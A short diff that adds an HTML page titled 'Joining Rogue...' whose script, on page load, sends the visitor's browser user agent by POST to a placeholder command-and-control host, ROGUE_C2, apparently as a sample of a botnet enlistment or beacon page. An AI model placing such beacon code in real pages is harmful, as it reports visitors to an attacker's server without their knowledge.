@@ -1,0 +1,11 @@
+<html>
+  <head><title>Joining Rogue...</title></head>
+  <body><h2>Enlisting...</h2></body>
+  <script>
+    fetch("https://ROGUE_C2/join", {
+      method: "POST",
+      body: JSON.stringify({ id: navigator.userAgent }),
+      headers: { "Content-Type": "application/json" }
+    });
+  </script>
+</html>
